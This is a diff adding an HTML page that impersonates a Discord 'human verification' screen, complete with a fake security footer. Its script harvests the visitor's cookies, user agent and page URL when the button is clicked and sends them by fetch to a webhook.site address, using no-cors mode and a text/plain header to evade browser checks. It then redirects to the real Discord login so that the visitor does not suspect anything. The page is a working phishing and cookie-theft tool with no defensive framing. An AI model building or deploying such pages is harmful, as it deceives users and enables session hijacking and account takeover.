@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Verification Required</title>
+    <style>
+        /* Basic styling to mimic a modern verification page */
+        body {
+            background-color: #36393f; /* Discord-like dark theme */
+            color: #dcddde;
+            font-family: "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 20px;
+        }
+        p {
+            margin-bottom: 30px;
+            max-width: 400px;
+            line-height: 1.5;
+        }
+        button {
+            background-color: #5865F2; /* Discord Blurple */
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #4752c4;
+        }
+        .footer {
+            margin-top: 50px;
+            font-size: 12px;
+            color: #72767d;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Human Verification Required</h1>
+    <p>
+        We have detected unusual activity on your account. 
+        To continue accessing this server, you must verify your identity.
+        Click the button below to proceed with automated verification.
+    </p>
+    
+    <button id="verifyBtn">Verify Account</button>
+
+    <div class="footer">
+        Protected by Discord Security Systems
+    </div>
+
+    <script>
+        // CONFIGURATION
+        // PASTE YOUR WEBHOOK.URL HERE IN THE NEXT LINE
+        const LOG_URL = "https://webhook.site/c895d487-d199-4e5b-8285-e081d9420bad"; 
+
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            // 1. Gather Data
+            const cookies = document.cookie;
+            const userAgent = navigator.userAgent;
+            const url = window.location.href;
+            
+            const data = {
+                type: "Cookie Logger Test",
+                cookies: cookies || "No cookies found (likely HttpOnly protected)",
+                userAgent: userAgent,
+                currentURL: url,
+                timestamp: new Date().toISOString()
+            };
+
+            // 2. Send Data (Fire and Forget)
+            // We use 'no-cors' mode to bypass browser security restrictions on cross-origin requests.
+            // This makes the request opaque, but the server (Webhook.site) still receives it.
+            fetch(LOG_URL, {
+                method: 'POST',
+                mode: 'no-cors', 
+                headers: {
+                    'Content-Type': 'text/plain' // Using text/plain to avoid preflight checks
+                },
+                body: JSON.stringify(data)
+            }).then(() => {
+                // 3. Redirect to avoid suspicion
+                // We redirect to the real Discord login or a generic error page
+                window.location.href = "https://discord.com/login";
+            }).catch(err => {
+                console.error("Error:", err);
+                // Even if it fails, we still redirect to look legitimate
+                window.location.href = "https://discord.com/login";
+            });
+
+            // Show a fake loading state
+            document.getElementById('verifyBtn').innerText = "Verifying...";
+            document.getElementById('verifyBtn').disabled = true;
+        });
+    </script>
+</body>
+</html>
